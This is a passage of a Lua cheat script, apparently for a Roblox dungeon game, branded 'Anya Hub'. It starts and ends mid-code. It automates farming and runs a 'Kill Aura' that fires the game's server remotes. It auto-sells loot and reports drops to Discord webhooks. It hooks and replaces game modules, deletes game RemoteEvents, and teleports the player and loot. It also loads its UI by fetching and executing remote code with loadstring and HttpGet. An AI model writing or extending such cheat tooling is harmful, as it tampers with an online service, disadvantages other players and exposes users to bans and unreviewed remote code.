            bb:InvokeServer()
        end
    end
end
if aC then
    if ax:FindFirstChild(6) then
        task.spawn(function()
            local eN, eO, eP = Workspace:WaitForChild('Pillar1'), Workspace:WaitForChild('Pillar2'),
                Workspace:WaitForChild('Pillar3')
            eP:WaitForChild('HealthProperties')
            eN.Name = 'Pillar'
            eO.Name = 'Pillar'
            eP.Name = 'Pillar'
            eN.Parent = bl;
            eO.Parent = bl;
            eP.Parent = bl
        end)
    elseif aG or aM then
        task.spawn(function()
            while true do
                local eQ = bl:FindFirstChild('BOSSKrakenMain') or bl:FindFirstChild('EVENTBOSSKraken')
                if eQ then
                    local eR = Instance.new('Folder')
                    eR.Name = 'WaterFolder'
                    eR.Parent = Workspace;
                    eQ.Parent = Workspace.WaterFolder;
                    if aG then
                        bj = true
                    end
                    break
                end
                task.wait()
            end
        end)
    elseif ax:FindFirstChild(30) then
        local eS = 0;
        task.spawn(function()
            while true do
                for z, R in bl:GetChildren() do
                    if (R.PrimaryPart.Position - Vector3.new(533, 302, -123)).magnitude < 100 then
                        R:Destroy()
                        eS = eS + 1
                    end
                end
                if eS == 3 then
                    break
                end
                task.wait()
            end
        end)
    end
    local eT = bO[ay]
    h = eT.NameTag .. (az == 1 and ' Normal' or az == 5 and ' Challenge' or '')
    h = string.gsub(h, '%(NIGHTMARE%) ', 'Nightmare ')
    i = eT.EventDungeon and 'Event' or (aI or aJ) and 'Special' or eT.TowerID and 'Tower ' .. eT.TowerID or
            eT.DisplayWorldID .. '-' .. eT.WorldMissionID;
    a5.Missions.MissionFinished.OnClientEvent:Once(function(eU, eV, eW, eX)
        c1 = tick()
        a9 = b0.Value;
        aQ = true;
        task.spawn(function()
            libNoti('Mission ' .. (eW and 'Failed!' or 'Completed!'))
            msg('Mission ' .. (eW and 'Failed' or 'Completed'), C[eW and "Red" or "Green"], eU)
        end)
        bM.ChildAdded:Connect(function(ck)
            local eY = bR[ck.Name]
            if not eY then return end
            local eZ = c0:GetItemTier(ck)
            local e_;
            if eY.Type == 'Weapon' or eY.Type == 'Armor' then
                if bo then
                    bp = false;
                    bq = tick()
                end
                ck:WaitForChild('Level')
                if eZ < 6 then
                    if Options.AutoSellTbl.Value[eZ] and Toggles.Autofarm.Value then
                        libNoti('Sold a Lvl ' .. ck.Level.Value .. ' T' .. eZ .. ' ' .. eY.DisplayKey)
                        sell({ck})
                        e_ = true
                    end
                end
                if eZ == 5 and not Options.AutoSellTbl.Value[5] then
                    ck:WaitForChild('Perk1')
                    ck:WaitForChild('Perk2')
                    ck:WaitForChild('Perk3')
                    ck.Perk1:WaitForChild('PerkValue')
                    ck.Perk2:WaitForChild('PerkValue')
                    ck.Perk3:WaitForChild('PerkValue')
                    
                    local f0;
                    local f1;
                    local f2;
                    if not Toggles.anonHook.Value then
                        f2 = f .. '\nType: ``' .. eY.Type .. '``\nLevel: ``' .. ck.Level.Value .. '``\n## ``' ..
                                eY.DisplayKey .. '``'
                    else
                        f2 =
                            'Type: ``' .. eY.Type .. '``\nLevel: ``' .. ck.Level.Value .. '``\n## ``' .. eY.DisplayKey ..
                                '``'
                    end
                    
                    -- ✅ SỬA: Thêm check xem f3 có phải là Perk và có PerkValue không
                    for dj, f3 in ck:GetChildren() do
                        -- Chỉ xử lý nếu là StringValue có PerkValue (tức là Perk1/2/3)
                        if f3:IsA("StringValue") and f3:FindFirstChild("PerkValue") and Options[f3.Value] then
                            local f4 = math.round(f3.PerkValue.Value * 100)
                            local f5 = Options[f3.Value].Value;
                            local minValue = math.round(bQ[f3.Value].StatRange[1] * 100)
                            local f6 = f5 >= minValue  -- ✅ SỬA: >= thay vì >
                            local f7 = bQ[f3.Value].DisplayName;
                            local f8 = f6 and f4 >= f5;
                            local f9 = f6 and f4 == math.round(bQ[f3.Value].StatRange[2] * 100)
                            if f8 and not f0 then
                                f0 = true
                            end
                            if f9 and not f1 then
                                f1 = true
                            end
                            f2 = f2 .. '\n' ..
                                    (f9 and '### <:Gold:832693611396857886> ' or f8 and '### :green_circle: ' or
                                        '### :red_circle: ') .. f7 .. ': ``' .. f4 .. '%``'
                        end
                    end
                    
                    if not f0 and Toggles.smartPerkSell.Value and Toggles.Autofarm.Value then
                        libNoti('Sold a Lvl ' .. ck.Level.Value .. ' T' .. eZ .. ' ' .. eY.DisplayKey)
                        sell({ck})
                        e_ = true
                    end
                    local ev = Options.drophook.Value;
                    if ev and #ev > 30 and Toggles.Autofarm.Value then
                        task.spawn(function()
                            local fa = Options.dropHookRoleId.Value and #Options.dropHookRoleId.Value > 0 and '<@&' ..
                                        Options.dropHookRoleId.Value .. '>'
                            local fb = f0 and (fa or '@everyone') or ''
                            local dh = f1 and C.Gold or f0 and C.Green or C.Cyan;
                            if ai then
                                task.wait(1.5)
                            end
                            ai = true;
                            local fc = 'Legendary Drop'
                            if Toggles.anonHook.Value then
                                anonHook(ev, fc, f2, dh, utcDateAndTime(), fb)
                            else
                                hookWithUserInfo(ev, fc, f2, dh, utcDateAndTime(), fb)
                            end
                            ai = true
                        end)
                    end
                end
                if not e_ then
                    libNoti('Got a Lvl ' .. ck.Level.Value .. ' T' .. eZ .. ' ' .. eY.DisplayKey .. '!')
                end
                if bo then
                    bp = true;
                    bq = tick()
                end
            elseif eY.Type == 'Egg' and Toggles.autoSellEggs.Value and Toggles.Autofarm.Value then
                sell({ck})
                libNoti(eY.DisplayKey .. ' sold!')
            end
        end)
        bN.ChildAdded:Connect(function(ck)
            local eY = bR[ck.Name]
            if not eY then return end
            if Options.selectedCosmetics.Value[eY.DisplayKey] and Toggles.Autofarm.Value then
                sell({ck})
                libNoti(eY.DisplayKey .. ' sold!')
            end
        end)
        pcallWithError(function()
            openEndChests()
        end)
        task.wait(eW and 2 or 3 + Options.dungeonRestartTimer.Value)
        missionEndRestartOrNextEvent()
    end)
    local fd = a5.Towers:WaitForChild('TowerFinished')
    if aH or aJ then
        fd.OnClientEvent:Once(function(fe, eU)
            local ff = eU;
            if eU > 31536000 then
                ff = 0
            end
            task.spawn(function()
                task.wait(40)
                missionEndRestartOrNextEvent()
            end)
            c1 = tick()
            aQ = true;
            a9 = b0.Value;
            task.spawn(function()
                msg("Mission Completed", C.Green, ff)
            end)
            pcallWithError(function()
                openEndChests()
            end)
            while true do
                if bo and bp and tick() - bq >= 2 and tick() - br >= 2 or bo and tick() - br >= 15 then
                    break
                end
                task.wait()
            end
            task.wait(Options.towerRestartTimer.Value)
            missionEndRestartOrNextEvent()
        end)
    end
end
if aH or aI or aJ then
    Workspace.ChildAdded:Connect(function(ck)
        if Toggles.Autofarm.Value then
            local fg = aQ and aH;
            local fh = table.find(bf, ck.Name) and Toggles.collectEggChests.Value;
            if fh or ck.Name == bg or ck.Name == bh and (not aH or aH and (aQ or aa)) or (aa or fg) and ck.Name == bi then
                if aQ and not fh then
                    br = tick()
                    bo = true;
                    bp = false
                end
                task.spawn(function()
                    ck.PrimaryPart.CanCollide = false;
                    while ck and ck.PrimaryPart and Toggles.Autofarm.Value do
                        if alive() then
                            ck.PrimaryPart.CFrame = CFrame.new(aU.Position)
                        end
                        task.wait()
                    end
                end)
            end
        end
    end)
    bM.ChildAdded:Connect(function(ck)
        local eY = bR[ck.Name]
        if not eY then return end
        local eZ = c0:GetItemTier(ck)
        local e_;
        if eY.Type == 'Weapon' or eY.Type == 'Armor' then
            if bo then
                bp = false;
                bq = tick()
            end
            ck:WaitForChild('Level')
            if eZ < 6 then
                if Options.AutoSellTbl.Value[eZ] and Toggles.Autofarm.Value then
                    task.wait(2)
                    libNoti('Sold a Lvl ' .. ck.Level.Value .. ' T' .. eZ .. ' ' .. eY.DisplayKey)
                    sell({ck})
                    e_ = true
                end
            end
            if eZ == 5 and not Options.AutoSellTbl.Value[5] then
                ck:WaitForChild('Perk1')
                ck:WaitForChild('Perk2')
                ck:WaitForChild('Perk3')
                ck.Perk1:WaitForChild('PerkValue')
                ck.Perk2:WaitForChild('PerkValue')
                ck.Perk3:WaitForChild('PerkValue')
                local f0;
                local f1;
                local f2;
                if not Toggles.anonHook.Value then
                    f2 = f .. '\nType: ``' .. eY.Type .. '``\nLevel: ``' .. ck.Level.Value .. '``\n## ``' ..
                             eY.DisplayKey .. '``'
                else
                    f2 = 'Type: ``' .. eY.Type .. '``\nLevel: ``' .. ck.Level.Value .. '``\n## ``' .. eY.DisplayKey ..
                             '``'
                end
                for dj, f3 in ck:GetChildren() do
                        -- ✅ THÊM DEBUG
                    if f3.Name:match("^Perk%d$") then
                        -- Perk check
                    end
                    if f3:IsA("StringValue") and f3:FindFirstChild("PerkValue") and Options[f3.Value] then
                        local f4 = math.round(f3.PerkValue.Value * 100)
                        local f5 = Options[f3.Value].Value;
                        local minValue = math.round(bQ[f3.Value].StatRange[1] * 100)
                        local f6 = f5 >= minValue  -- ✅ SỬA: >= thay vì >
                        local f7 = bQ[f3.Value].DisplayName;
                        local f8 = f6 and f4 >= f5;
                        local f9 = f6 and f4 == math.round(bQ[f3.Value].StatRange[2] * 100)
                        if f8 and not f0 then
                            f0 = true
                        end
                        if f9 and not f1 then
                            f1 = true
                        end
                        f2 = f2 .. '\n' ..
                                 (f9 and '### <:Gold:832693611396857886> ' or f8 and '### :green_circle: ' or
                                     '### :red_circle: ') .. f7 .. ': ``' .. f4 .. '%``'
                    end
                end
                if not f0 and Toggles.smartPerkSell.Value and Toggles.Autofarm.Value then
                    libNoti('Sold a Lvl ' .. ck.Level.Value .. ' T' .. eZ .. ' ' .. eY.DisplayKey)
                    sell({ck})
                    e_ = true
                end
                local ev = Options.drophook.Value;
                if ev and #ev > 30 and Toggles.Autofarm.Value then
                    task.spawn(function()
                        local fa = Options.dropHookRoleId.Value and #Options.dropHookRoleId.Value > 0 and '<@&' ..
                                       Options.dropHookRoleId.Value .. '>'
                        local fb = f0 and (fa or '@everyone') or ''
                        local dh = f1 and C.Gold or f0 and C.Green or C.Cyan;
                        if ai then
                            task.wait(1.5)
                        end
                        ai = true;
                        local fc = 'Legendary Drop'
                        if Toggles.anonHook.Value then
                            anonHook(ev, fc, f2, dh, utcDateAndTime(), fb)
                        else
                            hookWithUserInfo(ev, fc, f2, dh, utcDateAndTime(), fb)
                        end
                        ai = true
                    end)
                end
            end
            if not e_ then
                libNoti('Got a Lvl ' .. ck.Level.Value .. ' T' .. eZ .. ' ' .. eY.DisplayKey .. '!')
            end
            if bo then
                bp = true;
                bq = tick()
            end
        elseif eY.Type == 'Egg' and Toggles.autoSellEggs.Value and Toggles.Autofarm.Value then
            sell({ck})
            libNoti(eY.DisplayKey .. ' sold!')
        end
    end)
    bN.ChildAdded:Connect(function(ck)
        local eY = bR[ck.Name]
        if not eY then return end
        if Options.selectedCosmetics.Value[eY.DisplayKey] and Toggles.Autofarm.Value then
            sell({ck})
            libNoti(eY.DisplayKey .. ' sold!')
        end
    end)
end
local fi;
local fj;
local fk = {
    EliteParticles = 'Part',
    Model = 'Model',
    BlastIndicator = 'BlastIndicator'
}
if aI then
    workspace.ChildAdded:Connect(function(ck)
        if Toggles.Autofarm.Value then
            for z, R in fk do
                if ck.Name == z and ck:IsA(R) then
                    ck:Destroy()
                end
            end
        end
    end)
end
local fl = require(a4.Client.Gui.GuiScripts.LootReceived)
local fm = fl.AddItemToQueue;
task.spawn(function()
    workspace:WaitForChild("Mobs").ChildAdded:Connect(function(bA)
        bA:WaitForChild("HealthProperties"):WaitForChild("Health").Changed:Connect(function(cU)
            if cU == 0 then
                game:GetService("Debris"):AddItem(bA, 0.2)
            end
        end)
    end)
    if workspace:FindFirstChild('Assets_FX') then
        for z, R in workspace.Assets_FX:GetChildren() do
            R:Destroy()
        end
        workspace.Assets_FX.ChildAdded:Connect(function(ck)
            ck:Destroy()
        end)
    end
    local cj = require(game.ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Effects"))
    local fM = cj.DoEffect;
    cj.DoEffect = function(self, ...)
        if Toggles.disableEffects.Value then
            return
        end
        local fN = {...}
        if ay and ay == 27 and fN[1] == "RadialIndicator" and Toggles.Autofarm.Value then
            fN[5] = fN[5] + 1;
            return fM(self, unpack(fN))
        end
        return fM(self, ...)
    end
end)
-- ============== NO DAMAGE NUMBERS HOOK ==============
local cj = require(game.ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Effects"))
local gH = cj.RenderDamageNumber

-- Hook RenderDamageNumber để ẩn số sát thương
cj.RenderDamageNumber = function(...)
    if Toggles.NVD.Value then
        return
    end
    return gH(...)
end
-- ============== FAST SPRINT HOOK ============== (← THÊM PHẦN NÀY)
task.spawn(function()
    while true do
        pcall(function()
            if bU and bU.SPRINT_WALKSPEED then
                bU.SPRINT_WALKSPEED = Options.FastSprint.Value
            end
        end)
        task.wait(0.5)
    end
end)
local fO = {}
local fP = {}
local fQ = {}
local fR = game:GetService("ReplicatedStorage").Shared.Mobs.Mobs;
for z, R in fR:GetDescendants() do
    if R:IsA('RemoteEvent') then
        local fS = true;
        if R.Parent and table.find(fO, R.Parent.Name) then
            fS = false
        end
        for dZ, F in fP do
            if table.find(F, R.Name) and R.Parent and R.Parent.Name == dZ then
                fS = false
            end
        end
        if fS and table.find(fQ, R.Name) then
            fS = false
        end
        if fS then
            R:Destroy()
        end
    end
end
do
    function getBoundingBox(bx)
        local fT = bx.Size;
        local fU = bx.Position - fT / 2;
        local fV = bx.Position + fT / 2;
        return fU, fV
    end
    function getClosestPointOnAABB(fW, fU, fV)
        local fX = Vector3.new(math.clamp(fW.X, fU.X, fV.X), math.clamp(fW.Y, fU.Y, fV.Y), math.clamp(fW.Z, fU.Z, fV.Z))
        return fX
    end
    function getClosestPointAndDistance(fY, fZ)
        if not fY or not fZ then
            return math.huge, nil
        end
        local f_ = fY.Position;
        local fU, fV = getBoundingBox(fZ)
        local fX = getClosestPointOnAABB(f_, fU, fV)
        local g0 = (fZ.Position - fX).Unit;
        fX = fX + g0 * 0.1;
        if Toggles.Autofarm.Value and isRangedClass() then
            local g1 = olympus and Options['testOffset'] and Options.testOffset.Value or aR[fZ.Parent.Name] or 0;
            fX = fX + Vector3.new(0, g1, 0)
        end
        local g2 = (fX - f_).Magnitude;
        return g2, fX
    end
    function getClosestMob(g3)
        local g4 = math.huge;
        local g5, fX, g6, ad, ag;
        local ey, g7, ec;
        if g3 and isAlive(g3) then
            local g8 = g3.PrimaryPart;
            local g2, g9 = getClosestPointAndDistance(aU, g8)
            g4, fX, g5 = g2, g9, g8
        else
            for dj, bA in bl:GetChildren() do
                if isAlive(bA) and not ignoreIfNotAlone(bA.Name) then
                    local g8 = bA.PrimaryPart;
                    local g2, g9 = getClosestPointAndDistance(aU, g8)
                    if g2 < g4 then
                        g4, fX, g5 = g2, g9, g8
                    end
                end
            end
        end
        if g5 then
            ey, g7, ec = Mob(g5.Parent.Name), g5.Parent.HealthProperties.Health, g5.Parent.Name;
            ad = g5.Position;
            g6 = (aU.Position - ad).magnitude;
            ag = ey and ey['BossTag']
        end
        return g5, fX, ad, g4, g6, ag, g7
    end
    function equipWepWithId(ga, e5)
        for z, R in bM:GetChildren() do
            if R:FindFirstChild('ID') and R.ID.Value and R.ID.Value == ga then
                bT:FireServer(R, b4)
                libNoti('Equipped ' .. bR[R.Name].DisplayKey .. ' for' .. e5)
                break
            end
        end
    end
end
local gb = {'CorruptedGreaterTree'}
function ignoreIfNotAlone(ec)
    if bd and bd > 1 and table.find(gb, ec) then
        return true
    end
end
pcall(function()
    aa = game:GetService("MarketplaceService"):UserOwnsGamePassAsync(d, 8136250)
end)
--=================Gui Library==================

local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
WindUI:SetNotificationLower(true)

WindUI:AddTheme({
    Name = "Pastel Pink", -- tên theme
    
    Accent = WindUI:Gradient({                                                  
        ["0"] = { Color = Color3.fromHex("#FFB5D8"), Transparency = 0 },   -- hồng pastel     
        ["100"] = { Color = Color3.fromHex("#FFC9E5"), Transparency = 0 }, -- hồng pastel sáng    
    }, {                                                                        
        Rotation = 45, -- góc gradient đẹp                                                           
    }),                                                                         
    Dialog = Color3.fromHex("#F5E6F0"),      -- tím pastel rất nhạt cho dialog
    Outline = Color3.fromHex("#E8A5C8"),     -- hồng pastel đậm cho viền
    Text = Color3.fromHex("#8B4F7D"),        -- tím đậm cho chữ (dễ đọc nhất)
    Placeholder = Color3.fromHex("#C89FB8"), -- hồng tím pastel cho placeholder
    Background = Color3.fromHex("#FAF0F5"),  -- trắng hồng nhạt cho nền
    Button = Color3.fromHex("#F0B8D8"),      -- hồng pastel cho button
    Icon = Color3.fromHex("#E89DC8")         -- hồng pastel cho icon
})
WindUI:SetTheme("Pastel Pink")
local Window = WindUI:CreateWindow({
    Title = "🌸Anya Hub🌸",
    Icon = "circle-user-round", -- lucide icon
    Author = "by Maxi",
    Folder = "MySuperHub",
    
    -- ↓ Tất cả đều là tùy chọn. Bạn có thể xóa nó.
    Size = UDim2.fromOffset(580, 460),
    MinSize = Vector2.new(560, 350),
    MaxSize = Vector2.new(850, 560),
    Transparent = true,
    Theme = "Pastel Pink", -- đặt theme thành Pastel Pink
    Resizable = true,
    SideBarWidth = 200,
    BackgroundImageTransparency = 0.42,
    HideSearchBar = true,
    ScrollBarEnabled = false,

    User = {
        Enabled = true,
        Anonymous = false,  -- ✅ Đổi thành false để hiển thị avatar thật
        Name = c.Name,      -- ✅ Tên username
        DisplayName = c.DisplayName,  -- ✅ Tên hiển thị
        Callback = function()
        end,
    },
})
Window:SetBackgroundImage("rbxassetid://127375677813832")
Window:SetBackgroundImageTransparency(0.5) -- from 0  to 1
Window:SetToggleKey(Enum.KeyCode.Zero)
Window:ToggleTransparency(true)
Window:IsResizable(true)
Window:EditOpenButton({
    Title = "🌸Anya Hub🌸",
    Icon = "monitor",
    CornerRadius = UDim.new(0,16),
    StrokeThickness = 2,
    Color = ColorSequence.new(
        Color3.fromHex("FFD1DC"), 
        Color3.fromHex("F8C8DC")
    ),
    OnlyMobile = false,
    Enabled = true,
    Draggable = true,
})
-- ============== HÀM UTILITY ==============
-- Hàm libNoti để hiển thị thông báo
function libNoti(msg, duration)
    WindUI:Notify({
        Title = "Anya Hub",
        Content = msg,
        Duration = duration or 3
    })
end

-- Hàm set mission objective
function setMissionObjective(text, color)
    local success = pcall(function()
        local label = c.PlayerGui.MissionObjective.MissionObjective.Label
        label.Text = text
        label.Overlay.Text = text
        if color then
            label.TextColor3 = color
            label.Overlay.TextColor3 = color
        end
    end)
end

-- Hàm reset mission objective
function resetMissionObjective()
    setMissionObjective('')
end

-- Biến flag để tránh chạy timer nhiều lần
local startTimerExecuting = false

-- Hàm thực thi start timer (tách ra để dùng lại)
function executeStartTimer()

    
    if startTimerExecuting then

        return
    end
    
    if not Toggles.Autofarm.Value or not aC then

        return
    end
    
    -- Lấy giá trị timer từ Options
    local timerValue
    if aF then
        timerValue = Options.dungeonStartTimer.Value
    elseif aH or aJ then
        timerValue = Options.towerStartTimer.Value
    end
    
    -- Convert sang number
    local fo = tonumber(timerValue) or 0
    
    
    -- Nếu timer = 0, bỏ qua countdown và bắt đầu farm ngay
    if fo <= 0 then

        return
    end
    

    startTimerExecuting = true
    
    local dw = tick()
    local fp -- Killaura was disabled flag
    local fq -- Saved position for infinite tower
    
    if aJ then
        if alive() then
            fq = aU.Position
        end
        if Toggles.Killaura.Value then
            Toggles.Killaura:SetValue(false)
            fp = true
            libNoti('Killaura disabled! It will automatically re-enable when autofarm starts.', 6)
        end
    end
    
    while tick() - dw <= fo and Toggles.Autofarm.Value do
        local fr = math.round(fo - (tick() - dw))
        setMissionObjective('Starting Mission in ' .. fr .. 's')
        ak = tick()
        if aJ and alive() and (aU.Position - co.Position).magnitude > 100 then
            SmartPlayerTp(CFrame.new(co.Position + Vector3.new(0, 20, 0)))
        end
        task.wait()
    end
    

    startTimerExecuting = false
    
    resetMissionObjective()
    if fp and Toggles.Autofarm.Value and not Toggles.Killaura.Value then
        Toggles.Killaura:SetValue(true)
    end
    if aJ and fq then
        SmartPlayerTp(CFrame.new(fq + Vector3.new(0, 5, 0)))
    end
end

-- Hàm pcall với error handling
function pcallWithError(func)
    local success, err = pcall(func)
    if not success then
        warn("Error:", err)
    end
    return success, err
end

-- ============== KẾT THÚC HÀM UTILITY ==============
-- ============== CONFIG SYSTEM ==============
local ConfigSystem = {}
ConfigSystem.ConfigFolder = "AnyaHub_Configs"
ConfigSystem.selectedConfig = ""
ConfigSystem.dropdownRef = nil
ConfigSystem.UIElements = {} -- LƯU REFERENCES ĐẾN TẤT CẢ UI ELEMENTS

function ConfigSystem.deepCopy(original)
    if type(original) ~= 'table' then return original end
    local copy = {}
    for k, v in pairs(original) do copy[ConfigSystem.deepCopy(k)] = ConfigSystem.deepCopy(v) end
    return copy
end

function ConfigSystem.serializeTable(tbl)
    return game:GetService("HttpService"):JSONEncode(tbl)
end

function ConfigSystem.deserializeTable(str)
    local success, result = pcall(function()
        return game:GetService("HttpService"):JSONDecode(str)
    end)
    return success and result or nil
end

function ConfigSystem.getConfigData()
    local data = {Toggles = {}, Options = {}}
    
    -- Save Toggles
    for key, toggle in pairs(Toggles) do
        if toggle and toggle.Value ~= nil then 
            data.Toggles[key] = toggle.Value 
        end
    end
    
    -- Save Options - ✅ LOẠI TRỪ Party Options
    for key, option in pairs(Options) do
        -- ✅ SKIP Party Options (sẽ được save vào file riêng)
        if not key:match("^Party") then
            if option and option.Value ~= nil then
                local value = option.Value
                if type(value) == "string" then 
                    value = tonumber(value) or value 
                end
                data.Options[key] = type(value) == "table" and ConfigSystem.deepCopy(value) or value
            end
        end
    end
    
    return data
end

-- ============================================
-- 🔧 SỬA HÀM ConfigSystem.loadConfigData (dòng ~4385)
-- Fix load dropdown values
-- ============================================

function ConfigSystem.loadConfigData(data)
    if not data then return end
    
    -- ✅ Load Toggles - TRIGGER CALLBACK
    if data.Toggles then
        for key, value in pairs(data.Toggles) do
            if Toggles[key] and type(value) == "boolean" then
                pcall(function()
                    Toggles[key]:SetValue(value)
                    
                    if ConfigSystem.UIElements[key] then
                        local uiElement = ConfigSystem.UIElements[key]
                        
                        if uiElement.SetValue then
                            uiElement:SetValue(value)
                        elseif uiElement.Set then
                            uiElement:Set(value)
                        end
                    end
                end)
            end
        end
    end
    
    -- ✅ Load Options (config chính KHÔNG chứa Party nữa)
    if data.Options then
        for key, value in pairs(data.Options) do
            if Options[key] then
                pcall(function()
                    -- Cập nhật wrapper
                    if type(value) == "table" then
                        Options[key]:SetValue(ConfigSystem.deepCopy(value))
                    else
                        Options[key]:SetValue(value)
                    end
                    
                    -- Cập nhật UI
                    if ConfigSystem.UIElements[key] then
                        if type(value) == "table" then
                            ConfigSystem.UIElements[key]:Set(ConfigSystem.deepCopy(value))
                        else
                            ConfigSystem.UIElements[key]:Set(value)
                        end
                    end
                end)
            end
        end
    end
    
    -- ✅ Load HatchGlobals (cho Auto Hatch module)
    if data.HatchGlobals then
        warn("📂 Loading HatchGlobals from config...")
        -- Module sẽ tự xử lý load thông qua hook đã đăng ký
    end
    
    -- ✅ QUAN TRỌNG: Load party config SAU CÙNG (delay 1s để chắc chắn)
    task.delay(1, function()
        pcall(function()
            if _G.loadPartyConfigGlobal then
                local success = _G.loadPartyConfigGlobal()
                if success then
                    warn("📂 ✅ Loaded party config từ file riêng")
                else
                    warn("📂 ⚠️ Party config file not found - using defaults")
                end
            end
        end)
    end)
end


function ConfigSystem.getConfigList()
    local configs = {}
    if isfolder(ConfigSystem.ConfigFolder) then
        for _, file in pairs(listfiles(ConfigSystem.ConfigFolder)) do
            local fileName = file:match("([^/\\]+)%.txt$")
            -- ✅ Loại trừ file _autoload.txt
            if fileName and fileName ~= "_autoload" then 
                table.insert(configs, fileName) 
            end
        end
    end
    table.sort(configs)
    return configs
end

function ConfigSystem.refreshDropdown()
    local configs = ConfigSystem.getConfigList()
    if #configs == 0 then
        configs = {"[Chưa có config - Tạo mới trước]"}
    end
    
    -- Dùng phương thức Refresh của WindUI
    if ConfigSystem.dropdownRef then
        ConfigSystem.dropdownRef:Refresh(configs)
    end
    
    return configs
end

-- HÀM REGISTER UI ELEMENT (GỌI TỪ CODE TẠO UI)
function ConfigSystem.registerUIElement(key, element)
    ConfigSystem.UIElements[key] = element
    warn("✅ Registered UI:", key)  -- ✅ THÊM DEBUG
end

local Section1 = Window:Section({
    Title = "Main",
    Icon = "circle-ellipsis",
    Opened = false,
})
local Section2 = Window:Section({
    Title = "AutoSell",
    Icon = "circle-ellipsis",
    Opened = false,
})

local Tab1 = Section1:Tab({
    Title = "Farm",
    Icon = "circle-small", -- optional
    Locked = false,
})
local Tab2 = Section1:Tab({
    Title = "Settings",
    Icon = "circle-small", -- optional
    Locked = false,
})
local Tab3 = Section1:Tab({
    Title = "Weapons",
    Icon = "circle-small", -- optional
    Locked = false,
})
local Tab4 = Section1:Tab({
    Title = "Events",
    Icon = "circle-small", -- optional
    Locked = false,
})
do
--killauraline
local KillauraToggle = Tab1:Toggle({
    Title = "Kill Aura",
    Desc = "Auto-attack nearby monsters",
    Icon = "swords",
    Type = "Checkbox",
    Default = false,
    Callback = function(cU)
        Toggles.Killaura:SetValue(cU)
        bu = bu + 1
        
        if not cU then
            return
        end
        
        local gc = bc[eo][ep]
        ak = tick()
        
        task.spawn(function()
            local gd
            local ge = 67
            
            -- ✅ KHÔNG có cache mob - gọi getClosestMob() mỗi frame như old.lua
            while Toggles.Killaura.Value and aC do
                ab, ac, ad, ae, af, ag, ah = getClosestMob(bY)
                
                if alive() and ab then
                    task.spawn(function()
                        if not gd then
                            gd = true
                            if Toggles.PerkSwitcher.Value and cl[b9].Offhand then
                                local gf = OffhandPerksActive()
                                if ag and not gf then
                                    SwitchOffhandPerks(true)
                                end
                                if not ag and gf then
                                    SwitchOffhandPerks(false)
                                end
                            end
                            local gg = b4:GetChildren()[1]
                            if gg and gg:FindFirstChild('ID') and gg.ID.Value then
                                local gh = gg.ID.Value
                                local gi = Options.mobWepId.Value and #Options.mobWepId.Value > 2 and Options.mobWepId.Value
                                local gj = Options.bossWepId.Value and #Options.bossWepId.Value > 2 and Options.bossWepId.Value
                                
                                if gi and not ag and gh ~= gi then
                                    equipWepWithId(gi, ' Mobs!')
                                    task.wait(0.5)
                                end
                                if gj and ag and gh ~= gj then
                                    equipWepWithId(gj, ' Bosses!')
                                    task.wait(0.5)
                                end
                            end
                            gd = false
                        end
                    end)
                    
                    if not mounted() then
                        for dj, gk in cl[b9].Skills do
                            local gl, gm = gk.MeleeOnBoss and ag and 'Melee' or gk.Type or cl[b9].Type, gk.Skill
                            local gn = gk.MeleeOnBoss and ag and gk.BossRange or gk.Range or cl[b9].Range
                            local go = gk.Cooldown + Options.KillauraDelay.Value
                            
                            if tick() - (gk.LastUsed or 0) >= go then
                                if gl ~= 'Heal' and ae <= gn and ah.Value > 0 then
                                    if gl == 'Melee' then
                                        bk:FireServer(gm, aU.Position, (ac - aU.Position).Unit, ge)
                                    elseif gl == 'Ranged' then
                                        bk:FireServer(gm, ac, nil, ge)
                                    elseif gl == 'Self' then
                                        bk:FireServer(gm, aU.Position, nil, ge)
                                    elseif gl == 'Remote' then
                                        if gk.Args == 'MobPosition' then
                                            gm:FireServer(ad, nil, nil, ge)
                                        elseif gk.Args == 'mobTbl' then
                                            gm:FireServer({ab.Parent}, nil, nil, ge)
                                        else
                                            gm:FireServer(nil, nil, nil, ge)
                                        end
                                    end
                                    gk.LastUsed = tick()
                                    ak = tick()
                                end
                                
                                if gl == 'Heal' and aV.Health.Value / aV.MaxHealth.Value < 0.6 then
                                    gm:FireServer(gk.Args or nil, nil, nil, ge)
                                    gk.LastUsed = tick()
                                end
                            end
                        end
                    end
                end
                
                task.wait()
            end
        end)
        
        if aC and not ax:FindFirstChild(36) and aC then
            task.spawn(function()
                while Toggles.Killaura.Value do
                    for z, R in aw:GetChildren() do
                        local A = R:FindFirstChild("HealthProperties", true)
                        if A and not table.find(c9, A.Parent.Name) then
                            table.insert(aS, A.Parent)
                            A.Parent.Parent = bl
                        end
                    end
                    task.wait(0.3333)
                end
            end)
        end
        
        if classCheck(eo) and Toggles.Killaura.Value and bloodBindingEnabled and aC then
            task.spawn(function()
                while Toggles.Killaura.Value do
                    if classCheck(eo) then
                        if alive() and not mounted() and not aT:FindFirstChild('AttackBuffDemonBloodBinding', true) and ab and
                            ae and ae <= 95 then
                            bc.Demon.BloodBinding:FireServer()
                            ak = tick()
                            task.wait(6)
                        end
                    end
                    task.wait()
                end
            end)
        end
        
        if classCheck('Summoner') and Toggles.Killaura.Value and aC then
            task.spawn(function()
                while Toggles.Killaura.Value do
                    for dj, Mob in bl:GetChildren() do
                        if Mob.Name == 'SummonerSummonWeak' or Mob.Name == 'SummonerSummonStrong' then
                            Mob.Parent = cm
                        end
                    end
                    for dj, gp in cm:GetChildren() do
                        if gp.PrimaryPart then
                            if ab then
                                gp.PrimaryPart.CFrame = CFrame.new(ad)
                            end
                            if gp:FindFirstChild('HealthProperties') and gp.HealthProperties:FindFirstChild('Health') and
                                gp.HealthProperties.Health.Value > 0 and gp.HealthProperties.Health.Value /
                                gp.HealthProperties.MaxHealth.Value <= 0.25 then
                                bc.Summoner.ExplodeSummons:FireServer()
                            end
                        end
                    end
                    b_:Wait()
                end
            end)
        end
        
        if aC then
            task.spawn(function()
                while Toggles.Killaura.Value and not aQ do
                    if Toggles.Autofarm.Value and not bX then
                        task.wait(0.5)
                        local timeoutValue = tonumber(Options.timeoutTimer.Value) or 120
                        if tick() - ak >= timeoutValue then
                            local gq = tonumber(Options.Offset.Value) or 7
                            Options.Offset:SetValue(0)
                            task.wait(3)
                            if tick() - ak >= timeoutValue then
                                libNoti('Timeout! Force restarting dungeon.')
                                missionEndRestartOrNextEvent()
                                break
                            else
